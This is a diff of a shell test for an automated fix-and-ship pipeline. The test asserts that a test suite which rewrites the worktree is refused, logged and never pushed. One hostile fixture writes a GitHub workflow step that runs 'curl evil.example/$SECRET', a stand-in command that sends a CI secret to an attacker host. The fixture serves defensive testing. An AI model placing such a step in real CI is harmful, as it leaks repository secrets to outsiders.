@@ -64,33 +64,27 @@ run_night() { # case, test_cmd
 run_night hostile 'printf "name: CI\non: [push]\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl evil.example/\$SECRET\n" > .github/workflows/ci.yml; echo pwned > exfil.txt; true'
 d="$TMP/hostile"; LEDGER="$d/state/ledger.jsonl"
 
-jq -e 'select(.outcome=="shipped")' "$LEDGER" >/dev/null 2>&1 \
-  || { cat "$d/err" >&2; fail "nothing shipped — the hostile-suite case never reached a commit"; }
-
+# THE assertion: nothing reaches the remote. A green suite that rewrote the worktree tested a tree
+# that is NOT the one ADR 0027 would commit, so its verdict does not describe the branch — and a
+# verdict that does not describe the artifact is not a gate for it.
 branch="$(git -C "$d/remote.git" for-each-ref --format='%(refname:short)' 'refs/heads/nightshift/*' | head -1)"
-[ -n "$branch" ] || fail "no nightshift/* branch on the remote although the ledger says shipped"
-
-# THE assertion: the workflow on the pushed branch is the one that was reviewed, not the one the
-# suite wrote. GitHub would execute the latter with repository secrets before any human looked.
-pushed_ci="$(git -C "$d/remote.git" show "$branch:.github/workflows/ci.yml")"
-grep -q 'echo honest' <<<"$pushed_ci" \
-  || { echo "$pushed_ci" >&2; fail "the pushed workflow is not the reviewed one"; }
-if grep -q 'curl evil.example' <<<"$pushed_ci"; then
-  echo "$pushed_ci" >&2
-  fail "the TEST GATE rewrote .github/workflows/ci.yml and it was pushed — unreviewed CI with repo secrets"
+if [ -n "$branch" ]; then
+  pushed_ci="$(git -C "$d/remote.git" show "$branch:.github/workflows/ci.yml" 2>/dev/null || true)"
+  if grep -q 'curl evil.example' <<<"$pushed_ci"; then
+    fail "the TEST GATE rewrote .github/workflows/ci.yml and it was pushed — unreviewed CI with repo secrets"
+  fi
+  fail "a branch was pushed although the suite modified the worktree it was judging"
 fi
-# …and a file the suite created must not ride along either.
-if git -C "$d/remote.git" cat-file -e "$branch:exfil.txt" 2>/dev/null; then
-  fail "a file the test gate created was committed to the branch"
+if [ -f "$LEDGER" ] && jq -e 'select(.outcome=="shipped")' "$LEDGER" >/dev/null 2>&1; then
+  jq -c . "$LEDGER" >&2; fail "the ledger records a ship although the gate's verdict was void"
 fi
-# The fix itself still has to be there, or this test would pass for a shipped no-op.
-git -C "$d/remote.git" show "$branch:README.md" | grep -q 'This is the demo' \
-  || fail "the reviewed fix is missing from the branch — the reviewed tree was not committed"
-
-# Discarding the suite's work is a decision, not an accident: the run has to say so, because a
-# lockfile a test run legitimately refreshed is being dropped here too.
-grep -q "test gate modified the worktree" "$d/err" "$d/out" \
-  || { cat "$d/err" >&2; fail "the run discarded the gate's changes without saying so"; }
+# Refusing is a decision, not a crash: the run has to name it, because a lockfile a test run
+# legitimately refreshed lands here too and the operator has to know why the finding stalled.
+grep -q "MODIFIED the worktree" "$d/err" "$d/out" \
+  || { cat "$d/err" >&2; fail "the run refused without saying the suite had modified the worktree"; }
+# And it must not have burned every fix iteration re-running the same non-hermetic suite.
+[ "$(grep -c "MODIFIED the worktree" "$d/err")" -le 1 ] \
+  || { cat "$d/err" >&2; fail "the refusal was retried — a non-hermetic suite is not a regression Fix can repair"; }
 
 # --- 2. a well-behaved suite still ships normally -----------------------------
 # The guard must not cost anything when the suite touches nothing — otherwise every honest night
@@ -103,7 +97,7 @@ jq -e 'select(.outcome=="shipped")' "$LEDGER" >/dev/null 2>&1 \
 branch="$(git -C "$d/remote.git" for-each-ref --format='%(refname:short)' 'refs/heads/nightshift/*' | head -1)"
 git -C "$d/remote.git" show "$branch:README.md" | grep -q 'This is the demo' \
   || fail "the fix is missing from a normal ship"
-grep -q "test gate modified the worktree" "$d/err" "$d/out" \
+grep -q "MODIFIED the worktree" "$d/err" "$d/out" \
   && fail "a suite that changed nothing was reported as having modified the worktree"
 
 # --- 3. no recorded reviewed tree means no commit -----------------------------
